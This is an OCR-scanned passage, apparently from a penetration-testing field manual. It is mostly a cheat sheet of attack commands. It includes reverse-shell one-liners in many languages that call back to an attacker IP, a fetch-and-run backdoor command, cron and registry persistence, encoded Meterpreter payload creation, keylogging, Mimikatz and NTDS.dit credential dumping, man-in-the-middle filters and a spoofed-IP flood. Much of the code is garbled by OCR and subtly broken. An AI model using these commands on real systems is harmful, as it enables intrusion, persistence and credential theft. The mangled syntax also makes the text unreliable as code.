+RCPT TO: you@you.com 
+DATA 
+
+Thank You. 
+quit 
+
+
+43 
+
+
+Reverse Shells m [3] [4] 
+
+
+NETCAT (* START LISTENER ON ATTACK BOX TO CATCH SHELL) 
+
+nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell 
+
+nc 10.0.0.1 1234 -e cmd.exe Windows reverse shell 
+
+Netcat (some versions don't support -e option) 
+
+nc -e /bin/sh 10.0.0.1 1234 
+
+Netcat work-around when -e option not possible 
+
+rm /tmp/f ;mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2 &l|nc 10.0.0.1 1234 /tmp/f 
+
+
+Perl 
+
+
+perl -e 'use Socket; $i="10 . 0 . 0 . 1" ; $p=1234; socket (S, PF_INET, SOCK_STREAM, 
+getprotobyname ("tcp") ) ; if (connect (S, sockaddr_in ($p, inet_aton ($i) ) ) ) { 
+open(STDIN," &S" ) ; open (STDOUT, " &S"); open ( STDERR, &S"); exec ( "/bin/sh - 
+
+i") ; } ; ' 
+
+Perl without /bin/sh 
+
+
+perl -MIO -e ' $p=fork; exit, if ($p) ; $c=new 
+
+10 : : Socket : : INET ( PeerAddr , "attackerip : 44 4 4 " ) ; ST DIN- fdopen ( $c, r ) ; $ — 
+fdopen ( $c, w) ; system$_ while . 
+
+
+Perl for Windows 
+
+
+perl -MIO -e '$c=new 10: : Socket :: INET (PeerAddr, "attackerip: 4444 "); STDIN- 
+f dopen ( $c, r ) ; $ — fdopen ( $c, w) ; system$_ while ;' 
+
+
+Python 
+
+
+python -c 'import socket , subprocess , os ; s=socket . socket ( socket .AF_INET, 
+socket . SOCK_STREAM) ; s . connect ( ( "10 . 0 . 0 . 1" , 1234 ) ) ; os . dup2 ( s . f ileno ( ) , 0) 
+os . dup2 ( s . f ileno ( ) , 1 ) ; os .dup2 ( s . f ileno ( ) , 2 ) ; 
+p=subprocess . call ( [ "/bin/sh" , "-i" ] ) ; ' 
+
+
+Bash 
+
+
+bash -i & /dev/tcp/10 . 0 . 0 . 1/8080 0 &1 
+
+
+Java 
+
+
+r = Runtime . getRuntime ( ) 
+
+p = r . exec ([ "/bin/bash" , "-c" , "exec 5 /dev/tcp/10 . 0 . 0 . 1/2002; cat &5 | 
+while read line; do \$line 2 &5 & 5; done"] as String []) 
+
+p . waitFor ( ) 
+
+PHP 
+
+
+php -r ' $sock=f sockopen ( "10 . 0 . 0 . 1" , 1234 ); exec ( "/bin/sh -i &3 &3 2 &3");' 
+
+
+44 
+
+
+Ruby 
+
+
+ruby -rsocket -e ' f=TCPSocket . open ( "10 . 0 . 0 . 1" , 1234 ). to_i ; exec 
+sprintf ( "/bin/sh -i &%d &%d 2 &%d",f,f,f)' 
+
+
+Ruby without /bin/sh 
+
+
+by -rsocket -e ’exit if 
+
+fork; c=TCPSocket . new ( "attackerip" , "4444 " ) ; while ( cmd=c . gets ) ; 10 . popen ( cmd, "r 
+" ) { I io | c . print io.read}end' 
+
+
+Ruby for Windows 
+
+
+ruby -rsocket -e 
+
+' c=TCPSocket . new ( "attacker ip" , "4 444") ; while (cmd=c . gets ) ; 10 . popen ( cmd, "r " ) { | 
+io|c. print io.readjend’ 
+
+
+Telnet 
+
+
+rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p 
+— OR— 
+
+telnet attackerip 4444 ! /bin/bash | telnet attackerip 4445 
+
+
+Xterm 
+
+
+xterm -display 10.0.0.1:1 
+o Start Listener: Xnest :1 
+
+o Add permission to connect: xhost +victimIP 
+
+
+Mi sc 
+
+
+wget hhtp:// server /backdoor. sh -0- I sh Downloads and runs backdoor. sh 
+
+
+45 
+
+
+Persistence 
+
+
+For Linux persistence (on attack box) 
+
+
+crontab -e : set for every 10 min 
+0-59/10 1 A ; 1 nc ip '"' 7r ’ -e /bin/bash 
+
+Windows task scheduler persistence (start task scheduler) 
+
+
+sc config schedule start= auto 
+net start schedule 
+
+at 13:30 ""C : \nc . exe ip ' 7 ' 7 7 -e cmd.exe" 
+
+
+Windows persistent backdoor with firewall bypass 
+
+
+1. REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
+/v firewall /t REG_SZ /d M c : \windows\system32\backdoor . exe" /f 
+
+2. at 19:00 /every :M, T , W, Th, F cmd /c start "%USERPROFILE%\backdoor.exe" 
+
+3. SCHTASKS /Create /RU "SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR 
+"%USERPROFILE%\backdoor.exe" /ED 12/12/2012 
+
+
+Remote payload deployment via SMB or WebDAV [6] 
+
+
+Via SMB: 
+
+1. From the compromised machine, share the payload folder 
+
+2. Set sharing to 'Everyone' 
+
+3. Use psexec or wmic command to remotely execute payload 
+Via WebDAV: 
+
+1. Launch Metasploit 'webdav_f ile_server ' module 
+
+2. Set following options: 
+
+• localexe=true 
+
+• localfile= payload. 
+
+• localroot= payload directory 
+
+• disablePayloadHandler=true 
+
+3. Use psexec or wmic command to remotely execute payload 
+
+psexec \\ remote ip /u domain\compromised_user /p password "\\ payload 
+ip \test\msf.exe" 
+
+-- OR - 
+
+wmic /node: remote ip /user : domain\compromised_user //password-.password 
+process call create "\\ payload ip \test\msf.exe" 
+
+
+46 
+
+
+
+Tunneling 
+
+
+FPIPE - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2 
+
+
+fpipe.exe -1 1234 -r 80 2. 2. 2. 2 
+
+SOCKS.EXE - SCAN INTRANET THROUGH SOCKS PROXY 
+
+
+On redirector ( 1 . 1 . 1 , 1 } : 
+
+socks.exe -il. 1.1.1 -p 8080 
+
+On attacker: 
+
+Modify /etc/proxychains . conf : 
+
+Comment out : #proxy_dns 
+
+Comment out: #socks4a 12" .0.0.1 9050 
+
+Add line: socks4 1.1. 1.1 8080 
+
+Scan through socks proxy: 
+
+proxychains nmap -PN -vv -sT -p 22,135,139, 4 4 5 2. 2. 2. 2 
+
+SOCAT - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2 
+
+
+socat TCP4 :LISTEN: 1234 TCP4 : 2 . 2 . 2 . 2 : 80 
+
+
+STUNNEL ~ SSL ENCAPSULATED NC TUNNEL (WINDOWS & LINUX) [8] 
+
+
+On attacker (client) : 
+
+Modify /stunnel . conf 
+client = yes 
+[netcat client] 
+accept = 5555 
+
+connect = -Listening IP-:4444 
+
+On victim (listening server): 
+
+Modify /stunnel . conf 
+client = no 
+[netcat server] 
+accept = 4444 
+connect = 
+
+C:\ nc -vlp " ’ 
+
+On attacker (client) : ■ 
+
+# nc -nv 12". 0.0.1 5555 
+
+
+4 " 
+
+
+Google Hacking 
+
+
+site: [url] 
+numrange: [#]...[#] 
+date : [ # ] 
+
+
+■■■ 
+
+
+search only one [url] 
+search within a number range 
+search within past [#] months 
+
+
+link: [url] 
+
+find 
+
+pages 
+
+that 
+
+link to 
+
+[url 
+
+] 
+
+related: [url] 
+
+find 
+
+pages 
+
+related to [url] 
+
+
+intitle: [string] 
+
+find 
+
+pages 
+
+with 
+
+[ string] 
+
+in 
+
+title 
+
+inurl: [string] 
+
+find 
+
+pages 
+
+with 
+
+[string] 
+
+in 
+
+url 
+
+filetype: [xls] 
+
+find 
+
+files 
+
+that 
+
+are xls 
+
+
+
+Phonebook: [name] 
+
+find 
+
+phone 
+
+book 
+
+listings 
+
+of 
+
+[name 
+
+
+Video Teleconferencing 
+
+
+Polycom 
+
+
+telnet ip 
+
+#Enter 1 char, get uname:pwd 
+http:// ip /getsecure.cgi 
+http:// ip /en_a_rcl . htm 
+http:// ipVa_security.htm 
+http:// ip /a_rc.htm 
+
+
+Tandberg 
+
+
+http:// ip. /snapctrl . ssi 
+
+
+Sony webcam 
+
+
+http:// ip /command/visca-gen . cgi?visca= str 
+810104 6202FF : Freeze Camera 
+
+
+48 
+
+
+
+
+
+Tool Syntax 
+
+
+50 
+
+
+
+Nmap 
+
+
+Scan types 
+
+
+sU : udp scan 
+sO : protocol scan 
+
+
+Options 
+
+
+-sP : ping scan 
+-sS : syn scan 
+-sT : connect scan 
+
+
+-pl-65535 
+-T [0-5] 
+
+
+-0 
+
+-A 
+
+
+ports 
+
+0=5111, l = 15s , 2= . 4s 
+no dns resolution 
+OS detection 
+aggressive scan 
+
+
+-sV : version detection 
+-PN : no ping 
+-6 : IPv6 scan 
+
+--randomize-hosts 
+
+
+Output/ Input 
+
+
+write to xml file 
+write to grep file 
+save as all 3 formats 
+read hosts from file 
+excludes hosts in file 
+
+
+Advanced options 
+
+
+-oX file ■ 
+
+-oG file ■ 
+
+-oA file 
+-iL file, 
+-excludefile file 
+
+
+-sV -p# — scr ipt=banner 
+-traceroute 
+
+Firewall evasion 
+
+
+-f 
+
+-S ip 
+-g # 
+
+-D ip , ip 
+— mtu # 
+
+
+fragment packets 
+spoof src 
+spoof src port 
+Decoy 
+
+set MTU size 
+
+
+Convert Nmap XML file to HTML: 
+
+
+-ttl : set TTL 
+— script script. 
+
+
+— spoof-mac mac 
+— data-length size 
+(append random data) 
+--scan-delay 5s 
+
+
+xsltproc nmap. xml -o nmap.html 
+
+
+Generate live host file: 
+
+nmap -sP -n -oX out. xml 1.1.1.0/24 2.2.2.0/24 | grep "Nmap" I cut -d M " -f 
+5 - live_hosts.txt 
+
+Compare Nmap results 
+
+
+ndiff scanl.xml scan2.xml 
+
+
+DNS REVERSE LOOKUP ON IP RANGE 
+
+nmap -R -sL -dns-server server. 1.1.1.0/24 
+
+IDS Test (xmas scan with decoy IPs and spoofing) 
+
+for x in { 1 .. 10000 .. 1 }; do nmap -T5 -sX -S spoof-source-IP -D comma- 
+seperated with no spaces list of decoy IPs — spoof-mac aa:bb:cc:dd:ee: ff - 
+e ethO -Pn targeted-IP. ;done 
+
+
+51 
+
+
+WlRESHARK 
+
+
+eth . addr/ eth . dst . eth . src 
+
+
+rip . auth . passwd 
+
+RIP password 
+
+ip . addr/ip . dst/ip . src (ipv6.) 
+
+IP 
+
+tcp . port/tcp . dstport/tcp . s report 
+
+TCP ports 
+
+tep . flags (ack, fin, push, reset, syn, urg) 
+
+TCP flags 
+
+udp . port/udp . dstport/udp . sreport 
+
+UDP ports 
+
+http . authbasic 
+
+Basic authentication 
+
+http. www authentication 
+
+HTTP authentication 
+
+http . data 
+
+HTTP data portion 
+
+http . cookie 
+
+HTTP cookie 
+
+http . referer 
+
+HTTP referer 
+
+http . server 
+
+HTTP Server 
+
+http. user agent 
+
+HTTP user agent string 
+
+wlan.fc.type eq 0 
+
+802.11 management frame 
+
+wlan.fc.type eq 1 
+
+802.11 control frame 
+
+wlan.fc.type eq 0 
+
+802.11 data frame 
+
+wlan.fc.type subtype eq 0 (l=reponse) 
+
+802.11 association request 
+
+wlan. fc. type_subtype eq 2 (3=response) 
+
+802.11 reassociation req 
+
+wlan. fc. type_subtype eq 4 (5=response) 
+
+802.11 probe request 
+
+wlan . fc . type_subtype eq 8 
+
+802.11 beacon 
+
+wlan . f c . type_subtype eq 10 
+
+802.11 disassociate 
+
+wlan.fc.type subtype eq 11 ( 12=deauthenticate) 
+
+802.11 authenticate 
+
+Comparison operators 
+
+
+eq OR == 
+
+
+ne OR ! = 
+
+
+gt OR 
+
+
+It OR 
+
+
+ge OR -= 
+
+
+le OR = 
+
+
+Logical operators 
+
+
+
+and OR && 
+or OR || 
+xor OR AA 
+not OR ! 
+
+
+52 
+
+
+
+
+Netcat 
+
+
+Basics 
+
+
+Connect to [TargetIP] Listener on [port] : 
+$ nc [TargetIP] [port] 
+
+Start Listener: 
+
+$ nc -1 -p [port] 
+
+Port scanner 
+
+
+TCP Port Scanner in port range [startPort] to [endPort]: 
+$ nc -v -n -z -wl [TargetIP] [ startPort] - [endPort ] 
+
+File transfers 
+
+
+Grab a [filename] from a Listener: 
+
+1. Start Listener to push [filename] 
+
+$ nc -1 -p [port] [filename] 
+
+2. Connect to [TargetIP] and Retrieve [filename] 
+$ nc -w3 [TargetIP] [port] [filename] 
+
+Push a [filename] to Listener: 
+
+1. Start Listener to pull [filename] 
+
+$ nc -1 -p [port] [filename] 
+
+2. Connect to [TargetIP] and push [filename] 
+
+$nc -w3 [TargetIP] [port] - [filename] 
+
+
+Backdoor shells 
+
+
+Linux Shell: 
+
+$ nc -1 -p [port] -e /bin/bash 
+
+Linux Reverse Shell: 
+
+$ nc [LocallP] [port] -e /bin/bash 
+
+Windows Shell: 
+
+$ nc -1 -p [port] -e cmd.exe 
+
+Windows Reverse Shell: 
+
+$ nc [LocallP] [port] -e cmd.exe 
+
+
+53 
+
+
+VLC Streaming 
+
+
+# Use cvlc (command line VLC) on target to mitigate popups 
+
+Capture and stream the screen over UDP to <attackerip> : 1234 
+
+
+# Start a listener on attacker machine 
+
+vie udp://@:1234 
+
+-- OR - 
+
+# Start a listener that stores the stream in a file. 
+
+vie udp://@:1234 : sout=#transcode{ vcodec=h264, vb=0, scale=0, acodec=mp4a, 
+ab=128 , channel s=2 , samplerate=44 100 } : f ile { dst=test . mp4 } : no-sout-rtp-sap 
+
+: no-sout-standard-sap :ttl=l :sout-keep 
+
+# This may make the users screen flash. Lower frame rates delay the video. 
+
+# vie screen:// : screen-fps=25 : screen-caching=100 
+
+: sout=#transcode { vcodec=h264 , vb=0, scale=0, acodec=mp4a, ab=128, channels=2, sam 
+plerate=4 4100} : udp { dst= at t acker ip. :• : 1234 } : no-sout-rtp-sap : no-sout- 
+standard-sap :ttl=l :sout-keep 
+
+
+Capture and stream the screen over http 
+
+
+# Start a listener on attacker machine 
+■ vie http : //server . example . org : 8080 
+
+-- OR - 
+
+# Start a listener that stores the stream to a file 
+vie http : //server . example . org : 8080 -- 
+
+sout=#transcode{ vcodec=h264 , vb=0, scale=0, acodec=mp4a, ab=128, channels=2, samp 
+lerate=44 100 } : f ile { dst=test .mp4 } 
+
+# Start streaming on target machine 
+
+- vie screen:// : screen-fps=25 : screen-caching=100 
+
+: sout=#transcode{ vcodec=h264, vb=0, scale=0, acodec=mp4a, ab=128, channels=2, sam 
+plerate=44100} : http {mux=ffmpeg {mux=flv} , dst= : 8080/ } : no-sout-rtp-sap :no- 
+sout-standard-sap :ttl=l :sout-keep 
+
+
+Capture and stream over broadcast 
+
+
+# Start a listener on attacker machine for multicast 
+vie udp: / / @ - multi cast addr.- : 1234 
+
+# Broadcast stream to a multicast address 
+
+■ vie screen:// : screen-fps=25 : screen-caching=100 
+
+: sout=#transcode { vcodec=h264 , vb=0, scale=0, acodec=mp4a, ab=128, channels=2, sam 
+plerate=44100 } : udp { dst=- multicastaddrt : 1234 } : no-sout-rtp-sap :no-sout- 
+
+standard-sap :ttl=l :sout-keep 
+
+
+Capture and record your screen to a file 
+
+
+vie screen:// : screen-fps=25 : screen-caching=100 
+: sout=#transcode { vcodec=h264 , vb=0, scale=0, acodec=mp4a, ab=128 , channels=2 , sam 
+plerate=4 4 100 } : file{dst=C:\\ Program Files (x86) \\VideoLAN\\VLC\\ test .mp4 } 
+
+: no-sout-rtp-sap : no-sout-standard-sap :ttl=l :sout-keep 
+
+
+Capture and stream the microphone over udp 
+
+
+vie dshow:// : dshow-vdev="None" : dshow-adev="Your Audio Device" 
+
+54 
+
+
+
+SSH 
+
+
+/etc/ssh/ssh_known__hosts #System-wide known hosts 
+
+-/ . ssh/known_hosts #Hosts user has logged into 
+
+sshd-generate #Generate SSH keys (DSA/RSA) 
+
+ssh keygen -t dsa -f /etc/ssh/ssh_host_dsa_key #Generate SSH DSA keys 
+
+ssh keygen -t rsa -f /etc/ssh/ssh_host_rsa_key #Generate SSH RSA keys 
+
+S If already in ssh session, press SHIFT ~C to configure tunnel 
+S Port forwarding must be allowed on target 
+S /etc/ssh/sshd_conf ig - AllowTcpForwarding YES 
+
+
+TO ESTABLISH AN SSH CONNECTION ON DIFFERENT PORT 
+
+; ssh root @2. 2. 2. 2 -p 8222 
+
+Setup XI 1 forwarding from target, from attack box run 
+
+xhost+ 
+
+> vi ~/ . ssh/conf ig - Ensure 'ForwardXll yes' 
+
+> ssh -X root @2. 2. 2. 2 
+
+Remote port forward on 8080, forward to attacker on 443 
+
+ssh -R8080:12~. 0.0. 1:443 root@2 . 2 . 2 . 2 . 
+
+
+Local port forward on port 8080 on attack box and forwards 
+THROUGH SSH TUNNEL TO PORT 3300 ON INTERNAL TARGET 3. 3. 3. 3 
+
+> ssh -L8080:3.3.3.3:443 root@2.2.2.2 
+
+
+Dynamic tunnel used in conjunction with proxychains. Ensure 
+
+/ETC/PROXYCHAINS . CONF IS CONFIGURED ON CORRECT PORT (1080) 
+
+
+> ssh -D1080 root@2.2.2.2 
+
+In a separate terminal run: 
+
+: proxychains nmap -sT -p80,443 3. 3. 3. 3 
+
+
+55 
+
+
+Metasploit 
+
+
+
+
+msfcli | grep exploit/window 
+
+List Windows exploits 
+
+msfencode -1 
+
+List available encoders 
+
+msfpayload -h 
+
+List available payloads 
+
+show exploits 
+
+
+show auxiliary 
+
+Display auxiliary modules 
+
+show payloads 
+
+Display payloads 
+
+search -string.-- 
+
+Search for string 
+
+info -module 
+
+Show module information 
+
+use -module- 
+
+Load exploit or module 
+
+show options 
+
+Displays module options 
+
+show advanced 
+
+Displays advanced options 
+
+set option .'value 
+
+Sets a value 
+
+sessions -v 
+
+List session: -k # (kill) 
+
+-u # (upgrade to Meterpreter) 
+
+sessions -s script 
+
+Run Meterpreter script on all 
+sessions 
+
+jobs -1 
+
+List all jobs (-k # = kill) 
+
+exploit -j 
+
+Run exploit as job 
+
+route add ip nmask sid. 
+
+Pivoting 
+
+loadpath /home/modules 
+
+Load 3rd party tree 
+
+
+Live Ruby interpreter shell 
+
+connect -s -ip- 443 
+
+SSL connect (NC clone) 
+
+route add ip mask - session id - 
+
+Add route -through session (pivot) 
+
+exploit/multi/handler - set 
+ExitOnSession False 
+
+Advanced option allows for multiple 
+shells 
+
+set ConsoleLogging true (also 
+SessionLogging) 
+
+Enables logging 
+
+
+Create encoded Meterpreter payload (For Linux: -t elf -o 
+callback) 
+
+
+. /msfpayload windows/meterpreter/reverse_tcp LHOST= ip LPORT=<port R | 
+./msfencode -t exe -o callback.exe -e x86/shikata_ga_nai -c 5 
+
+
+Create bind Meterpreter payload 
+
+
+./msfpayload windows/meterpreter/bind_tcp RHOST= ip LPORT= port X 
+cb . exe 
+
+
+Create encoded payload using msfvenom using exe template 
+
+
+./msfvenom --payload windows/meterpreter/reverse_tcp — format exe — 
+template calc.exe -k --encoder x86/shikata_ga_nai -i 5 LH0ST=1 . 1 . 1 . 1 
+LP0RT=4 4 3 callback.exe 
+
+
+56 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Start MSF DB (BT5 = mysql. Kali = postgresql) 
+
+
+> /etc/rc . d/rc .mysqld start 
+
+msf db_create root :pass@localhost/metasploit 
+msf load db_mysql 
+
+msf db_connect root :pass@localhost/metasploit 
+msf db_import nmap.xml. 
+
+Kali 
+
+# service postgresql start 
+
+# service metasploit start 
+
+Pass a Shell (by default will launch notepad and inject) 
+
+msf use post/windows/manage/multi_meterpreter_inj ect 
+msf. set IPLIST attack ip 
+msf set LPORT -callback pert 
+
+msf set PIDLIST PID to inject, default creates new notepad 
+msf set PAYLOAD windows/meterpreter/reverse_tcp 
+msf. set SESSION meterpreter session ID 
+
+HTTP BANNER SCAN ON INTERNAL NETWORK 
+
+msf route add ip/range. netmask meterpreter ID 
+
+msf use post/multi/gather/ping_sweep # Set options and run 
+
+msf use /auxiliary/scanner/portscan/tcp # Set options and run 
+
+msf- hosts -u -S x.x.x -R # Searches for x.x.x.- and sets 
+
+# RHOSTS 
+
+msf use auxiliary/scanner/http/http_version # Set options and run 
+
+msf -- services -v -p 80 -S x.x.x -R # Displays IPs x.x.x. A with port 
+
+# 80 open 
+
+
+5 
+
+
+Meterpreter 
+
+
+help 
+
+
+sysinfo 
+
+Display system info 
+
+ps 
+
+List processes 
+
+getpid 
+
+List current PID 
+
+upload - file/ C:\\Program\ FilesW 
+
+Upload file 
+
+download - file. 
+
+Download file 
+
+reg command 
+
+Interact with registry 
+
+rev2self 
+
+Revert to original user 
+
+shell 
+
+Drop to interactive shell 
+
+migrate PID 
+
+Migrate to another PID 
+
+background 
+
+Background current session 
+
+keyscan ( start | stop | dump) 
+
+Start/Stop/Dump keylogger 
+
+execute -f cmd.exe -i 
+
+Execute cmd.exe and interact 
+
+execute -f cmd.exe -i -H -t 
+
+Execute cmd.exe as hidden process 
+and with all tokens 
+
+hasdump 
+
+Dumps local hashes 
+
+run - script - 
+
+Executes script 
+(/ scripts/meterpreter ) 
+
+portfwd [add | delete] -L 127.0.0.1 -1 
+
+Port forward 3389 through session. 
+
+443 -r 3. 3. 3. 3 -p 3389 
+
+Rdesktop to local port 443 
+
+
+Privilege escalation 
+
+
+use priv 
+getsystem 
+
+
+Impersonate token (drop token will stop impersonating) 
+
+
+use incognito 
+list_tokens -u 
+
+impersonate_token domain\\user 
+
+
+Nmap through Meterpreter Socks proxy 
+
+
+1. msf- sessions # Note Meterpreter ID 
+
+2. msf- route add 3. 3. 3.0 255.255.255.0 id 
+
+3. msf- use auxiliary/server/socks4a 
+
+4 . msf run 
+
+5. Open new shell and edit /etc/proxychains . conf 
+
+i . #proxy_dns 
+
+ii. #socks4 12" 7 . 0.0.1 9050 
+
+iii. socks4 1.1. 1.1 1080 
+
+6. Save and Close conf file 
+
+7. proxychains nmap -sT -Pn -p80,135,445 3. 3. 3. 3 
+
+
+Railgun - Windows API calls to pop a message box 
+
+
+meterpreter irb 
+
+client . railgun . user 32 . MessageBoxA (O, "got" , "you" , "MB_OK" ) 
+
+
+58 
+
+
+
+
+
+
+
+Create persistent Windows service 
+
+msf - use post/windows/manage/persistence 
+
+msf set LHOST -attack ip ..- 
+
+msf. set LPORT callback port. 
+
+msf .- set PAYLOAD_TYPE TCP | HTTP | HTPS 
+
+msf- set REXENAME filename 
+
+msf:- set SESSION meterpreter session id 
+
+msf- set STARTUP SERVICE 
+
+Gather recently accessed files and web links 
+
+meterpreter run post/windows/gather /dumplinks 
+
+Spawn new process and tree C : \ 
+
+> execute -H -f cmd.exe -a '/c tree /F /A c:\ . C:\temp\tree.txt' 
+
+
+59 
+
+
+Ettercap 
+
+
+Man-in-the-Middle with filter 
+
+ettercap.exe -I -'if ace..- -M arp -Tq -F file.ef MACs / IPs / Ports 
+MACs / IPs / Ports. 
+
+#i . e . : //80,443 // = any MAC, any IP, ports 80,443 
+
+Man -in- the -Middle entire subnet with applied filter 
+
+ettercap -T -M arp -F filter - // // 
+
+Switch flood 
+
+ettercap -TP rand_flood 
+
+
+Ettercap Filter 
+
+
+Compile Ettercap filter 
+
+etterfilter f ilter . filter -o out.ef 
+
+Sample filter - kills VPN traffic and decodes HTTP traffic 
+
+if (ip. proto == UDP && udp.dst == 500) { 
+drop ( ) ; 
+kill (7; } 
+
+if (ip . src == ' ip ' ) { 
+if (tcp.dst == 80) { 
+
+if ( search ( DATA. data, "Accept-Encoding" ) ) { 
+
+replace ( "Accept-Encoding" , "Accept-Rubbish ! " ) ; 
+msg ( "Replaced Encoding\n" ) ; 
+
+} 
+
+} 
+
+} 
+
+
+60 
+
+
+
+Mimikatz 
+
+
+1. Upload mimikatz.exe and sekurlsa.dll to target 
+
+2. execute mimikatz 
+
+3. mimikatz# privilege :: debug 
+
+4. mimikatz# in j ect :: process lsass.exe sekurlsa.dll 
+
+5. mimikatz# @getLogonPasswords 
+
+Hping3 
+
+DOS FROM SPOOFED IPS 
+
+hping3 targetIP --flood — frag — spoof - ip --destport # — syn 
+
+ARPing 
+
+ARP SCANNER 
+
+./arping -I eth# -a # arps 
+
+Wine 
+
+Compile EXE in Backtrack 
+
+cd /root/ . wine/drive_c/MinGW/bin 
+wine gcc -o file.exe /tmp/ code.c 
+wine file . exe 
+
+GRUB 
+
+Change root password 
+
+GRUB Menu: Add 'single' end of kernel line. Reboot. Change root pass, reboot 
+
+Hydra 
+
+
+Online brute force 
+
+> hydra -1 ftp -P words -v targetIP. ftp 
+
+
+61 
+
+
+John the Ripper 
+
+
+Cracking with a wordlist 
+
+
+$ . /john -wordfile:pw.lst -format : -format. - hash.txt 
+
+
+Format examples 
+
+
+$ john --format=des 
+$ john --format=lm 
+$ john — format=md5 
+
+
+username : SDbsugeBiC58A 
+username : $LM$a9c604d24 4c4e99d 
+$1$1234 5 67 8$alccj 83HRDBo6uxlbVx 7 Dl 
+
+
+$ john — format=raw-shal A9993E364706816ABA3E2571"850C26C9CD0D89D 
+
+
+# For — format=netlmv2 replace $NETLM with $NETLMv2 
+$ john — format=netlm 
+
+$NETLM$ 1122334 4 55 6677 88$0836F085B124 F338 958' 7 5FB1951905DD2F85252CC 7 31BB25 
+username : $NETLM$1 122334 455 667 7 88$0836F085B124 F338 9587 5FB1951 905DD2F85252CC7 
+31BB25 
+
+username :$NETLM$1 122334 455 6 6 7 7 88$ 083 6F085B124 F338958 7 5FB1 951 905DD2F85252CC7 
+31BB25 : :::::: 
+
+
+# Exactly 36 spaces between USER and HASH (SAPB and SAPG) 
+
+$ john — format=sapb 
+
+ROOT $8366A4E9E6B72CB0 
+
+username :ROOT $8366A4E9E6B72CB0 
+
+$ john --format=sapg 
+
+ROOT $1194E3 8F14B9F3F8DA1B181F14DEB7 0E7BDCC23 9 
+
+username : ROOT 
+
+$1 194E38F14B9F3F8DAlBl8lFl4DEB r ’0E' 7 BDCC239 
+$ john — format=shal-gen 
+
+$SHAlp$salt$5 9b3e8d637 c f 97 e dbe2384cf 59cb7 453dfe30789 
+username : $SHAlp$salt$5 9b3e8d63" cf 97edbe2384cf 59cb7453dfe30789 
+
+$ john — format=zip 
+$ z ip $ * 0 * 1 k 8 0 0 5blb7d0 7 7 0 8d k dee4 
+username : $zip$ ^0 k I jr 8 005blb7d0 7 '’' 7 08d*dee4 
+
+
+Password Wordlist 
+
+Generate wordlist based off single word 
+
+
+# Add lower (Q), upper(,), number (%), and symbol (' ) to the end of the word 
+crunch 12 12 -t baseword@,%“ wordlist.txt 
+
+# Use custom special character set and add 2 numbers then special character 
+maskprocessor -custom-charsetl=\ ! \@\#\$ baseword?d?d?l - -- wordlist.txt 
+
+
+62 
+
+
+
+VS SOWN [2] 
+
+1 . Download: http : //pt scripts . google code . com/ s vn/ 1 r unk/ windows /vss own . vbs 
+
+2 . Create a new Shadow Copy 
+
+a. cscript vssown.vbs /start (optional) 
+
+b. cscript vssown.vbs /create 
+
+3. Pull the following files from a shadow copy: 
+
+a . copy 
+
+V\? \GLOBALROOT\ Device \Harddi s kVolumeShadowCopy [X] \ windows \ 
+ntds\ntds . dit . 
+
+b . copy 
+
+\ \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy [X] \ windows \ 
+system3 2 \config\ SYSTEM . 
+
+c . copy 
+
+\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy [X] \ windows \ 
+system32\conf ig\SAM . 
+
+4. Copy files to attack box. 
+
+5. Download tools: http://www.ntdsxtract.com/downloads/ntds_dump_hash.zip 
+
+6. Configure and Make source code for libesedb from the extracted package 
+
+a. cd libesedb 
+
+b. chmod +x configure 
+
+c. ./configure && make 
+
+17 . Use esedbdumphash to extract the datatable from ntds.dit. 
+
+a. cd esedbtools 
+
+b. ./esedbdumphash ../../ntds.dit 
+
+8. 8a. Use dsdump.py to dump hashes from datatable using bootkey from 
+SYSTEM hive 
+
+a. cd . . / . . /creddump/ 
+
+b. python ./dsdump.py ../SYSTEM 
+
+. . / libesedb/ esedbtools/ntds . dit . export /datatable 
+
+9. 8b. Use bkhive and samdump2 to dump hashes from SAM using bootkey from 
+SYSTEM hive. 
+
+a. bkhive SYSTEM key.txt 
+
+b. samdump2 SAM key.txt 
+
+10. Dump historical hashes 
+
+a. python . /dsdumphistory . py ../system 
+
+. . /libesedb/ esedbtools/ntds . dit . export /datatable 
+
+
+63 
+
+
+File Hashing 
+
+
+Hash lengths 
+
+MD5 16 bytes 
+
+SHA-1 20 bytes 
+SHA-256 32 bytes 
+
+SHA-512 64 bytes 
+
+Software hash database 
+
+http://isc.sans. edu/ tools /ha shsearch . html 
+
+# dig +short md5- .ind5.dshield.org TXT 
+
+Result = " filename ■ I source. " i.e. "cmd.exe | NIST" 
+
+Malware hash database 
+
+http : //www. team-cymru . org/ Services/MHR 
+
+# dig +short [MD5 | SHA-1 ] .malware . hash . cymru . com TXT 
+Result = -last seen timestamp -AV detection rate. 
+
+Convert timestamp = perl -e 'print scalar localtime ( timestamp -) , "\n"' 
+
+File metadata search 
+
+https : // f ileadvisor . bit 9 . com/ services /search . aspx 
+
+Search VirusTotal database 
+
+https : //www . virus total . com/# search 
+
+
+64 
+
+
+
+65 
+
+
+Web 
+
+
+66 
+
+
+
+Common User-Agent Strings 
+
+
+
+
+
+
+Mozilla/5.0 (Windows NT 
+Gecko/20100101 Firefox/5 
+
+6.1; WOW 6 4 ; rv: 
+
+.0 
+
+: 5 . 0) 
+
+Firefox 
+
+5 . 0/Win7 64-bit 
+
+Mozilla/5.0 (Windows NT 5.1; rv:13.0) 
+Gecko/20100101 Firefox/13 . 0 . 1 
+
+
+Firefox 
+
+13 . 0/WinXP 32-bit 
+
+Mozilla/5.0 (Windows NT 
+Gecko/20100101 Firefox/1 
+
+6.1; WOW64; rv: 
+
+7.0 
+
+: 1” . 0 ) 
+
+Firefox 
+
+l 7 . 0/Win" 7 64-bit 
+
+Mozilla/5.0 (XI 1; Ubuntu 
+rv : 17 . 0 ) Gecko/20100101 
+
+; Linux x86 64; 
+Firefox/1" . 0 
+
+
+Firefox 
+
+1" . 0/Linux 
+
+Mozilla/5.0 (Macintosh; 
+rv : 17 . 0 ) Gecko/20100101 
+
+Intel Mac OS X 
+Firefox/1' 7 . 0 
+
+10."; 
